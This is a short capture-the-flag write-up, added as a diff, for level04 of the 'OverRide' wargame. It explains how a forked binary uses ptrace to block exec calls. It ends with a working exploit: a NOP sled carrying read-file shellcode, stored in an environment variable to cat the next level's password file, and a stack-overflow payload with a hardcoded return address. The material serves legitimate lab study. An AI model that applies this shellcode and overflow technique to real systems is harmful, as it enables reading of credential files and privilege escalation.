@@ -1,0 +1,17 @@
+In this level, we have a binary who write this: "Give me some shellcode, k"
+and then, he take the STDIN, and finally write "child is exiting...".
+
+After looking at the binary, we saw that he do a fork, take the stdin in the child
+while in the parent, he wait for the child to exit then do a ptrace.
+
+The ptrace will look for a shellcode with an exec(something) and in this case,
+he puts "no exec() for you" and then, kill the child before we can do anything.
+
+So, we just had this time, to pass a shellcode who cat the file:
+"/home/users/level05/.pass".
+
+The exploit is:
+
+level04@OverRide:~$ MAIL=$(python -c 'print "\x90" * 5000 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"')
+level04@OverRide:~$ python -c 'print "\x90"*156 + "\xf8\xdd\xff\xff"' | ./level04
+
